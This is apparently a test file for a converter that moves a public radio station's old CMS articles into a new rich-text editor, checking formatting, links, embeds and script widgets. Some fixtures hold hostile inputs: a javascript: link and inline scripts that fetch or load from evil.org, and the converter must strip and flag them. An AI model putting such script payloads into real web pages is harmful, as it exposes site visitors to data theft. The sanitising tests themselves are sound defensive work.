import { describe, expect, it } from 'vitest'

import { Ctx } from './context'
import { htmlToNodes } from './html'
import { FORMAT } from './lexical'
import type { LexNode } from './types'

const run = (html: string, hosts: string[] = []) => {
  const ctx = new Ctx('seed', hosts)
  return { nodes: htmlToNodes(html, ctx), ctx }
}
const texts = (n: LexNode): string =>
  n.type === 'text' ? String(n.text) : n.type === 'linebreak' ? '\n' : ((n.children as LexNode[] | undefined) ?? []).map(texts).join('')
const codes = (ctx: Ctx) => ctx.entries.map((e) => e.code)

describe('paragraphs and whitespace', () => {
  it('keeps the text and order of each paragraph', () => {
    const { nodes } = run('<p>First.</p><p>Second.</p>')
    expect(nodes.map(texts)).toEqual(['First.', 'Second.'])
    expect(nodes.every((n) => n.type === 'paragraph')).toBe(true)
  })
  it('drops the empty and space-only paragraphs Grove is full of, without a word', () => {
    const { nodes, ctx } = run('<p></p><p>&nbsp;</p><p> </p><p><br></p><p>Real.</p><p></p>')
    expect(nodes.map(texts)).toEqual(['Real.'])
    expect(ctx.entries).toEqual([])
  })
  it('collapses newlines and runs of spaces inside a paragraph, and trims the ends', () => {
    expect(run('<p>  one\n   two   three  </p>').nodes.map(texts)).toEqual(['one two three'])
  })
  it('turns a line break into a line break and drops one at the edge', () => {
    const { nodes } = run('<p><br>Line one<br>Line two<br></p>')
    expect(nodes.map(texts)).toEqual(['Line one\nLine two'])
  })
  it('keeps text that sits outside any paragraph', () => {
    expect(run('Loose text<p>Then a paragraph.</p>').nodes.map(texts)).toEqual(['Loose text', 'Then a paragraph.'])
  })
})

describe('formatting', () => {
  it('maps bold, italic, underline, strikethrough and superscript to the editor\'s format bits', () => {
    const p = run('<p><b>b</b><i>i</i><u>u</u><strike>s</strike><sup>2</sup></p>').nodes[0]!
    expect((p.children as LexNode[]).map((c) => c.format)).toEqual([FORMAT.bold, FORMAT.italic, FORMAT.underline, FORMAT.strikethrough, FORMAT.superscript])
  })
  it('combines formats when tags nest', () => {
    const p = run('<p><b><i>both</i></b></p>').nodes[0]!
    expect((p.children as LexNode[])[0]!.format).toBe(FORMAT.bold | FORMAT.italic)
  })
  it('keeps the text of a tag it does not know, and says which tag it unwrapped', () => {
    const { nodes, ctx } = run('<p>Keep <blink>this</blink> text.</p>')
    expect(nodes.map(texts)).toEqual(['Keep this text.'])
    expect(ctx.entries).toEqual([{ level: 'noted', code: 'html.unwrapped-tag', detail: 'blink' }])
  })
  it('keeps the text of a font tag and notes that its colour and size were dropped', () => {
    const { nodes, ctx } = run('<p><font size="+2" color="red">Big</font></p>')
    expect(nodes.map(texts)).toEqual(['Big'])
    expect(codes(ctx)).toEqual(['html.font-formatting-dropped'])
  })
  it('centres a paragraph that Grove centred, by class or by a centre tag', () => {
    expect(run('<p class="cms-textAlign-center">x</p>').nodes[0]!.format).toBe('center')
    expect(run('<center><p>y</p></center>').nodes[0]!.format).toBe('center')
  })
})

describe('links', () => {
  const link = (html: string) => {
    const { nodes, ctx } = run(html)
    const l = (nodes[0]!.children as LexNode[]).find((c) => c.type === 'link')
    return { l, ctx, fields: l?.fields as { url: string; newTab: boolean; linkType: string } | undefined }
  }
  it('keeps an outside link and whether it opens in a new tab', () => {
    const { fields } = link('<p><a href="https://example.org/a?b=1" target="_blank">x</a></p>')
    expect(fields).toEqual({ linkType: 'custom', url: 'https://example.org/a?b=1', newTab: true })
  })
  it('makes a link to our own site relative, so it keeps working whatever the domain', () => {
    expect(link('<p><a href="https://www.wuwf.org/local-news/2020-01-02/a-story">x</a></p>').fields?.url).toBe('/local-news/2020-01-02/a-story')
    expect(link('<p><a href="http://wuwf.org/people/jane-doe?x=1#top">x</a></p>').fields?.url).toBe('/people/jane-doe?x=1#top')
  })
  it('adds https to an address that has none', () => {
    expect(link('<p><a href="www.countyhealthrankings.org/florida">x</a></p>').fields?.url).toBe('https://www.countyhealthrankings.org/florida')
  })
  it('refuses a javascript address, keeps the words, and flags it for review', () => {
    const { nodes, ctx } = run('<p>See <a href="javascript:alert(1)">this</a> now.</p>')
    expect(nodes.map(texts)).toEqual(['See this now.'])
    expect(JSON.stringify(nodes)).not.toContain('javascript')
    expect(ctx.entries).toEqual([{ level: 'preserved', code: 'link.unsafe-address-removed', detail: 'javascript:' }])
  })
  it('links the visible text when the address is unusable but the text is an address', () => {
    const { fields, ctx } = link('<p><a href="<garbage">https://example.org/page</a></p>')
    expect(fields?.url).toBe('https://example.org/page')
    expect(codes(ctx)).toContain('link.address-taken-from-text')
  })
  it('a mailto link survives', () => {
    expect(link('<p><a href="mailto:news@wuwf.org">mail</a></p>').fields?.url).toBe('mailto:news@wuwf.org')
  })
})

describe('escaped markup typed into link text', () => {
  const only = (html: string) => {
    const { nodes, ctx } = run(html)
    const l = (nodes[0]!.children as LexNode[]).find((c) => c.type === 'link')!
    return { children: l.children as LexNode[], ctx }
  }
  it('shows the words, bold, when the whole link text is wrapped in a typed <b> pair, and says so', () => {
    const { children, ctx } = only('<p>See <a href="/x">&lt;b&gt;I was shocked&lt;/b&gt;</a></p>')
    expect(children.map(texts)).toEqual(['I was shocked'])
    expect(children[0]!.format).toBe(FORMAT.bold)
    expect(codes(ctx)).toEqual(['link.escaped-markup-repaired'])
  })
  it('handles nested pairs and keeps every format they ask for', () => {
    const { children } = only('<p><a href="/x">&lt;strong&gt;&lt;i&gt;Both&lt;/i&gt;&lt;/strong&gt;</a></p>')
    expect(children.map(texts)).toEqual(['Both'])
    expect(children[0]!.format).toBe(FORMAT.bold | FORMAT.italic)
  })
  it('leaves link text alone when the tag is only mentioned, or the pair does not wrap everything', () => {
    expect(only('<p><a href="/x">Use &lt;b&gt; for bold</a></p>').children.map(texts)).toEqual(['Use <b> for bold'])
    expect(only('<p><a href="/x">Say &lt;b&gt;this&lt;/b&gt; twice</a></p>').children.map(texts)).toEqual(['Say <b>this</b> twice'])
    expect(only('<p><a href="/x">Plain</a></p>').ctx.entries).toEqual([])
  })
})

describe('"RELATED:" lines become related-story blocks', () => {
  const blockFields = (html: string) => {
    const { nodes, ctx } = run(html)
    return { nodes, ctx, f: nodes[0]?.type === 'block' ? (nodes[0].fields as Record<string, unknown>) : undefined }
  }
  it('turns a bold label and one link into a block carrying the label, the words and the address', () => {
    const { nodes, f, ctx } = blockFields('<p><b>RELATED:</b> <a href="https://www.wuwf.org/local-news/2024-11-14/lawmakers-react">Lawmakers react</a></p>')
    expect(nodes).toHaveLength(1)
    expect(f).toMatchObject({ blockType: 'relatedStory', label: 'Related', headline: 'Lawmakers react', url: '/local-news/2024-11-14/lawmakers-react' })
    expect(f).not.toHaveProperty('newTab')
    expect(ctx.mapped['block:relatedStory']).toBe(1)
    expect(ctx.mapped['paragraph']).toBeUndefined()
    expect(ctx.entries).toEqual([])
  })
  it('fixes the pattern from the real story: the headline arrives with typed <b> tags in the link text', () => {
    const { f, ctx } = blockFields('<p><b>RELATED: </b><a href="/politics/2024-11-14/shocked">&lt;b&gt;\'I was shocked\': Lawmakers react to Gaetz pick&lt;/b&gt;</a></p>')
    expect(f).toMatchObject({ blockType: 'relatedStory', headline: "'I was shocked': Lawmakers react to Gaetz pick", url: '/politics/2024-11-14/shocked' })
    expect(JSON.stringify(f)).not.toContain('<b>')
    expect(codes(ctx)).toEqual(['link.escaped-markup-repaired'])
  })
  it('accepts the other ways editors wrote the label, a real <b> inside the link, and an outside address', () => {
    expect(blockFields('<p>Related story – <a href="https://example.org/a" target="_blank"><b>Elsewhere</b></a></p>').f).toMatchObject({ label: 'Related story', headline: 'Elsewhere', url: 'https://example.org/a', newTab: true })
    expect(blockFields('<p><strong>Related coverage:</strong>&nbsp;<a href="/x">One</a></p>').f).toMatchObject({ label: 'Related coverage', headline: 'One' })
    expect(blockFields('<p>related <a href="/x">One</a></p>').f).toMatchObject({ label: 'Related' })
  })
  it('keeps the paragraph before and after it as they were', () => {
    const { nodes } = blockFields('<p>Before.</p><p><b>RELATED:</b> <a href="/x">Story</a></p><p>After.</p>')
    expect(nodes.map((n) => n.type)).toEqual(['paragraph', 'block', 'paragraph'])
  })
  it('leaves anything that is not exactly that pattern a paragraph, losing nothing', () => {
    for (const html of [
      '<p><b>RELATED:</b> <a href="/x">One</a> and <a href="/y">Two</a></p>',
      '<p><b>RELATED:</b> <a href="/x">One</a> from last week.</p>',
      '<p><b>RELATED:</b> no link here</p>',
      '<p>Read the related <a href="/x">story</a></p>',
      '<p><a href="/x">Story</a></p>',
      '<p><b>RELATED:</b> <a href="mailto:news@wuwf.org">Email us</a></p>',
      '<p><b>RELATED:</b> <a href="/x"></a></p>',
    ]) {
      const { nodes } = run(html)
      expect(nodes.map((n) => n.type), html).toEqual(['paragraph'])
    }
  })
  it('builds the same ids every time', () => {
    const html = '<p><b>RELATED:</b> <a href="/x">Story</a></p>'
    expect(blockFields(html).nodes).toEqual(blockFields(html).nodes)
  })
})

describe('headings, lists and quotes', () => {
  it('maps headings, and demotes a stray h1 because the page title is the h1', () => {
    const { nodes, ctx } = run('<h3>Section</h3><h1>Big</h1>')
    expect(nodes.map((n) => [n.type, n.tag])).toEqual([['heading', 'h3'], ['heading', 'h2']])
    expect(codes(ctx)).toEqual(['heading.h1-became-h2'])
  })
  it('maps bullet and numbered lists, with nesting', () => {
    const { nodes } = run('<ul><li>One</li><li>Two<ul><li>Inner</li></ul></li></ul><ol><li>First</li></ol>')
    expect(nodes[0]).toMatchObject({ type: 'list', listType: 'bullet' })
    expect((nodes[0]!.children as LexNode[]).map((c) => texts(c))).toEqual(['One', 'Two', 'Inner'])
    expect(nodes[1]).toMatchObject({ type: 'list', listType: 'number' })
  })
  it('turns a blockquote into one quote, a paragraph per line', () => {
    const { nodes } = run('<blockquote><p>Line one.</p><p>Line two.</p></blockquote>')
    expect(nodes[0]).toMatchObject({ type: 'quote' })
    expect(texts(nodes[0]!)).toBe('Line one.\nLine two.')
  })
  it('keeps a horizontal rule', () => {
    expect(run('<p>a</p><hr><p>b</p>').nodes.map((n) => n.type)).toEqual(['paragraph', 'horizontalrule', 'paragraph'])
  })
})

describe('what must never be imported, or lost without being said', () => {
  it('removes a script, keeps the page around it, and flags the story for review', () => {
    const { nodes, ctx } = run('<p>Before.</p><script async src="https://platform.twitter.com/widgets.js"></script><p>After.</p>')
    expect(nodes.map(texts)).toEqual(['Before.', 'After.'])
    expect(JSON.stringify(nodes)).not.toContain('widgets.js')
    expect(ctx.entries).toEqual([{ level: 'preserved', code: 'html.script-removed', detail: 'platform.twitter.com' }])
  })
  it('keeps a table as preserved HTML (the one thing the editor cannot hold) and flags it', () => {
    const { nodes, ctx } = run('<table><tbody><tr><td>Mon</td><td>9am</td></tr></tbody></table>')
    expect(nodes[0]).toMatchObject({ type: 'block', fields: { blockType: 'legacyHtml', note: 'Table from Grove' } })
    expect((nodes[0]!.fields as { html: string }).html).toContain('<td>Mon</td>')
    expect(codes(ctx)).toEqual(['html.table-preserved'])
  })
  it('notes a noscript and drops it', () => {
    const { nodes, ctx } = run('<p>a</p><noscript>fallback</noscript>')
    expect(nodes.map(texts)).toEqual(['a'])
    expect(codes(ctx)).toEqual(['html.noscript-removed'])
  })
})

describe('pictures and frames inside text', () => {
  it('turns an image into a media block with an asset token, splitting the paragraph around it', () => {
    const { nodes, ctx } = run('<p>Before <img src="//www.wuwf.org/sites/wuwf/files/a.jpg" alt="A cat" width="300"> after.</p>')
    expect(nodes.map((n) => n.type)).toEqual(['paragraph', 'block', 'paragraph'])
    expect(nodes[1]!.fields).toMatchObject({ blockType: 'mediaBlock', media: { $asset: 'https://www.wuwf.org/sites/wuwf/files/a.jpg' }, altText: 'A cat' })
    expect([...ctx.assets.values()]).toEqual([{ kind: 'image', sourceUrl: 'https://www.wuwf.org/sites/wuwf/files/a.jpg', alt: 'A cat', width: 300 }])
  })
  it('an image with no usable address is flagged, not silently skipped', () => {
    const { nodes, ctx } = run('<p>x<img src="resource://skype/ext"></p>')
    expect(nodes.map(texts)).toEqual(['x'])
    expect(codes(ctx)).toEqual(['image.no-address'])
  })
  it('a YouTube frame becomes an embed block', () => {
    const { nodes } = run('<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" title="A video"></iframe>')
    expect(nodes[0]!.fields).toMatchObject({ blockType: 'embed', url: 'https://www.youtube.com/embed/dQw4w9WgXcQ', title: 'A video' })
  })
  it('a frame from a built-in host becomes an embed that loads without a click', () => {
    const { nodes, ctx } = run('<iframe src="https://embed.documentcloud.org/documents/1/?embed=1" width="600" height="400"></iframe>')
    expect(nodes[0]!.fields).toMatchObject({ blockType: 'embed', url: 'https://embed.documentcloud.org/documents/1/?embed=1' })
    expect(ctx.entries).toEqual([])
  })
  it('a frame from any other public host still embeds, behind a click, and the report notes the host', () => {
    const { nodes, ctx } = run('<iframe src="https://maps.example.org/x" width="600" height="400"></iframe>')
    expect(nodes[0]!.fields).toMatchObject({ blockType: 'embed', url: 'https://maps.example.org/x' })
    expect(ctx.entries).toEqual([{ level: 'noted', code: 'embed.click-to-load', detail: 'maps.example.org' }])
  })
  it('a frame on a private address becomes a link, never nothing, and is flagged', () => {
    const { nodes, ctx } = run('<iframe src="https://192.168.1.5/x"></iframe>')
    expect(nodes[0]!.type).toBe('paragraph')
    expect(JSON.stringify(nodes[0])).toContain('https://192.168.1.5/x')
    expect(ctx.entries).toEqual([{ level: 'preserved', code: 'embed.private-host', detail: '192.168.1.5' }])
  })
  it('the same frame becomes an embed once its host is approved, keeping its proportions', () => {
    const { nodes, ctx } = run('<iframe src="https://embed.documentcloud.org/documents/1/" width="600" height="400"></iframe>', ['embed.documentcloud.org'])
    expect(nodes[0]!.fields).toMatchObject({ blockType: 'embed', width: 600, height: 400 })
    expect(ctx.entries).toEqual([])
  })
  it('an embedded tweet becomes a link-only X embed carrying the tweet\'s text, and its script is reported', () => {
    const { nodes, ctx } = run(
      '<blockquote class="twitter-tweet"><p lang="en">Storm update: roads are closed.</p>&mdash; WUWF (@WUWF) <a href="https://twitter.com/WUWF/status/1285659380751499264?ref_src=twsrc%5Etfw">July 21</a></blockquote><script async src="https://platform.twitter.com/widgets.js"></script>',
    )
    expect(nodes[0]!.fields).toMatchObject({ blockType: 'embed', url: 'https://twitter.com/WUWF/status/1285659380751499264?ref_src=twsrc%5Etfw', caption: 'Storm update: roads are closed.' })
    expect(codes(ctx)).toEqual(['html.script-removed'])
  })
})

describe('script widgets (the election-guide pattern)', () => {
  // The shape in Grove's real data: the event script is inside the container, the module script follows it.
  const real =
    '<div id="electup-embed" data-embed="36c12ca5-de84-4c35-979e-53f4f81c4d2e">\n  <script>window.dispatchEvent(new Event(\'electup_load\'));</script>\n</div>\n' +
    '<script type="module" src="https://static.electup.com/v2/app.js"></script>'
  it('converts the pattern as it really appears', () => {
    const { nodes, ctx } = run(real)
    expect(nodes).toHaveLength(1)
    expect(nodes[0]!.fields).toMatchObject({
      blockType: 'widget',
      scriptUrl: 'https://static.electup.com/v2/app.js',
      module: true,
      elementId: 'electup-embed',
      initEvent: 'electup_load',
      attributes: [{ name: 'data-embed', value: '36c12ca5-de84-4c35-979e-53f4f81c4d2e' }],
    })
    expect(ctx.entries).toEqual([{ level: 'noted', code: 'widget.script-embedded', detail: 'static.electup.com' }])
  })
  it('a different script inside the container is not a widget', () => {
    const { nodes, ctx } = run('<div id="g" data-a="1"><script>fetch("https://evil.org/x")</script></div><script src="https://x.org/m.js"></script>')
    expect(JSON.stringify(nodes)).not.toContain('"widget"')
    expect(codes(ctx)).toEqual(['html.script-removed', 'html.script-removed'])
  })
  const guide =
    '<div id="electup-guide" data-election-id="2026-general" data-county="escambia"></div>' +
    '<script>window.dispatchEvent(new Event("electupReady"));</script>' +
    '<script src="https://cdn.electup.org/guide.js"></script>'

  it('becomes one widget block carrying the container, its settings, the event and the script', () => {
    const { nodes, ctx } = run(`<p>Before.</p>${guide}<p>After.</p>`)
    expect(nodes.map((n) => n.type)).toEqual(['paragraph', 'block', 'paragraph'])
    expect(nodes[1]!.fields).toMatchObject({
      blockType: 'widget',
      scriptUrl: 'https://cdn.electup.org/guide.js',
      elementId: 'electup-guide',
      initEvent: 'electupReady',
      height: 600,
      title: 'Interactive content from cdn.electup.org',
      attributes: [{ name: 'data-election-id', value: '2026-general' }, { name: 'data-county', value: 'escambia' }],
    })
    // the script is not dropped silently and not imported: it is carried as a block and the report notes the host
    expect(ctx.entries).toEqual([{ level: 'noted', code: 'widget.script-embedded', detail: 'cdn.electup.org' }])
    expect(JSON.stringify(nodes)).not.toContain('dispatchEvent')
  })
  it('works without the one-line event script, and keeps a module script a module', () => {
    const { nodes } = run('<div id="g" data-a="1"></div>\n<script type="module" src="https://x.org/m.js"></script>')
    expect(nodes).toHaveLength(1)
    expect(nodes[0]!.fields).toMatchObject({ blockType: 'widget', module: true })
    expect((nodes[0]!.fields as Record<string, unknown>).initEvent).toBeUndefined()
  })
  it('builds the same ids every time', () => {
    expect(JSON.stringify(run(guide).nodes)).toBe(JSON.stringify(run(guide).nodes))
  })
  it('leaves any other inline script removed and flagged, and makes no widget of it', () => {
    const { nodes, ctx } = run('<div id="g" data-a="1"></div><script>fetch("https://evil.org/steal")</script><script src="https://x.org/m.js"></script>')
    expect(nodes.some((n) => n.type === 'block' && (n.fields as { blockType?: string }).blockType === 'widget')).toBe(false)
    expect(JSON.stringify(nodes)).not.toContain('evil.org')
    expect(codes(ctx)).toEqual(['html.script-removed', 'html.script-removed'])
  })
  it('a lone script, or a container with no script after it, is not a widget', () => {
    expect(codes(run('<script src="https://x.org/m.js"></script>').ctx)).toEqual(['html.script-removed'])
    expect(run('<div id="g" data-a="1"></div><p>Text</p>').nodes.map((n) => n.type)).toEqual(['paragraph'])
  })
  it('refuses a script that is not https or is on a private address', () => {
    for (const src of ['http://x.org/m.js', 'https://10.0.0.5/m.js', 'https://www.wuwf.org/m.js']) {
      const { nodes, ctx } = run(`<div id="g" data-a="1"></div><script src="${src}"></script>`)
      expect(JSON.stringify(nodes)).not.toContain('"widget"')
      expect(codes(ctx)).toContain('html.script-removed')
    }
  })
  it('a container that holds content is left alone', () => {
    const { nodes } = run('<div id="g" data-a="1"><p>Hello</p></div><script src="https://x.org/m.js"></script>')
    expect(JSON.stringify(nodes)).not.toContain('"widget"')
  })
})

describe('NPR Pym interactives', () => {
  const pym =
    '<p data-pym-src="https://apps.npr.org/dailygraphics/graphics/sim/child.html?interactive=true&amp;a=0.00">&nbsp;</p>' +
    '<script src="https://apps.npr.org/dailygraphics/graphics/sim/js/lib/pym.js" type="text/javascript"></script>'
  it('become a frame of the same address, loading without a click (NPR is a built-in host), and the loader script is not reported as lost', () => {
    const { nodes, ctx } = run(`<p>Try it.</p>${pym}`)
    expect(nodes.map((n) => n.type)).toEqual(['paragraph', 'block'])
    expect(nodes[1]!.fields).toMatchObject({ blockType: 'embed', url: 'https://apps.npr.org/dailygraphics/graphics/sim/child.html?interactive=true&a=0.00' })
    expect(ctx.entries.map((e) => e.code)).toEqual(['embed.pym-as-frame', 'embed.pym-loader-replaced'])
    expect(ctx.entries.every((e) => e.level === 'noted')).toBe(true)
  })
  it('does not excuse a pym-named script on its own, or any other script', () => {
    expect(codes(run('<script src="https://apps.npr.org/x/pym.js"></script>').ctx)).toEqual(['html.script-removed'])
    expect(codes(run(`${pym}<script src="https://evil.org/steal.js"></script>`).ctx)).toContain('html.script-removed')
  })
})
